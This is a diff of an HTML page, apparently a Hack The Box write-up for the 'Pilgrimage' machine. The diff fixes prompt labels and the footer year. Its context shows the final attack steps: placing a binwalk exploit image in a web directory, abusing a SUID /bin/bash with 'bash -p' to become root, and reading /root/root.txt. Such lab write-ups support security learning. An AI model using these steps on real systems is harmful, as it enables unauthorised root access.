-<div class="highlight"><pre><span></span><span class="nd">@emily@pilgrimage</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">cp</span> <span class="n">binwalk_exploit</span><span class="o">.</span><span class="n">png</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">pilgrimage</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">shrunk</span><span class="o">/</span><span class="n">pwned</span><span class="o">.</span><span class="n">png</span>
+<div class="highlight"><pre><span></span><span class="nd">emily@pilgrimage</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">cp</span> <span class="n">binwalk_exploit</span><span class="o">.</span><span class="n">png</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">pilgrimage</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">shrunk</span><span class="o">/</span><span class="n">pwned</span><span class="o">.</span><span class="n">png</span>
 </pre></div>
 
 Finally, when listing the privileges of <code>/bin/bash</code>, we notice that it is <code>Set-UID</code>:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@emily@pilgrimage</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">l</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
+<div class="highlight"><pre><span></span><span class="nd">emily@pilgrimage</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">l</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
 <span class="o">-</span><span class="n">rwsr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">1234376</span> <span class="n">Mar</span> <span class="mi">28</span>  <span class="mi">2022</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
-<span class="nd">@emily@pilgrimage</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
+<span class="nd">emily@pilgrimage</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
 </pre></div>
 
 Now, using <code>bash -p</code>, we gain access as root, and we can read the last flag:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@emily@pilgrimage</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">bash</span> <span class="o">-</span><span class="n">p</span>
+<div class="highlight"><pre><span></span><span class="nd">emily@pilgrimage</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">bash</span> <span class="o">-</span><span class="n">p</span>
 <span class="n">bash</span><span class="o">-</span><span class="mf">5.1</span><span class="root1">#</span><span class="n"> whoami</span>
 <span class="n">root</span>
 <span class="n">bash</span><span class="o">-</span><span class="mf">5.1</span><span class="root1">#</span><span class="n"> cat /root/root.txt</span>
@@ -810,7 +810,7 @@ Now, using <code>bash -p</code>, we gain access as root, and we can read the las
     </section>
 
     <footer>
-        <p>&copy; 2023 elswix.github.io</p>
+        <p>&copy; 2024 elswix.github.io</p>
     </footer>
 </body>
 </html>
